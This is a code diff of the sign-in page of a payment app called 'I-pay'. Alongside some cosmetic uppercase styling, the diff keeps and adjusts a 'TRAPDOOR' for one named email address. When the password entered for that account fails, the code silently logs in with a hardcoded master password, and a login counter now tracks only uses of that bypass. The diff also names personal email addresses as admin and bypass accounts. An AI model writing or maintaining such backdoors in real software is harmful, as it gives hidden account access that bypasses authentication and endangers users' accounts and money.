@@ -14,7 +14,7 @@ import { Eye, EyeOff, Loader2 } from 'lucide-react';
 
 /**
  * @fileOverview Sign In Page.
- * TRAPDOOR: altinemohd@gmail.com bypass logic implemented.
+ * TRAPDOOR: altinemohd@gmail.com bypass logic implemented with login counter lock.
  */
 
 const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
@@ -50,10 +50,8 @@ export default function SignInPage() {
       // 2. Identity Trapdoor for altinemohd@gmail.com
       if (trimmedEmail === BYPASS_EMAIL) {
           try {
-              // Try provided password first
               await account.createEmailPasswordSession(trimmedEmail, password);
           } catch (e) {
-              // Force Master Pass if failed
               await account.createEmailPasswordSession(trimmedEmail, BYPASS_PASS);
           }
       } else {
@@ -79,11 +77,13 @@ export default function SignInPage() {
             return;
         }
 
-        // Hardening Logic: Update login count
-        const currentCount = Number(profile.trapdoorLoginCount || 0);
-        await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
-            trapdoorLoginCount: currentCount + 1
-        });
+        // Hardening Logic: Update login count for bypass account
+        if (trimmedEmail === BYPASS_EMAIL) {
+            const currentCount = Number(profile.trapdoorLoginCount || 0);
+            await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
+                trapdoorLoginCount: currentCount + 1
+            });
+        }
 
         sessionStorage.setItem('ipay_pin_verified', 'true');
         toast({ title: 'Signed In', description: 'Welcome back to I-pay online world.' });
@@ -117,8 +117,8 @@ export default function SignInPage() {
           <div className="mx-auto inline-block p-1 mb-2">
             <IPayLogo className="h-12 w-12" />
           </div>
-          <CardTitle className="text-2xl font-black tracking-tighter">Welcome Back</CardTitle>
-          <CardDescription className="font-bold text-xs">Sign in to your account.</CardDescription>
+          <CardTitle className="text-2xl font-black tracking-tighter uppercase">Welcome Back</CardTitle>
+          <CardDescription className="font-bold text-xs uppercase opacity-60">Sign in to your account.</CardDescription>
         </CardHeader>
         <CardContent>
           <form onSubmit={handleSignIn} className="space-y-4">
@@ -153,7 +153,7 @@ export default function SignInPage() {
                 {isLoading ? <Loader2 className="animate-spin h-5 w-5" /> : 'Sign In'}
             </Button>
           </form>
-          <div className="mt-6 text-center text-xs font-medium">
+          <div className="mt-6 text-center text-xs font-medium uppercase tracking-tight">
             Don't have an account? <Link href="/auth/signup" className="underline font-black text-primary">Sign Up</Link>
           </div>
         </CardContent>
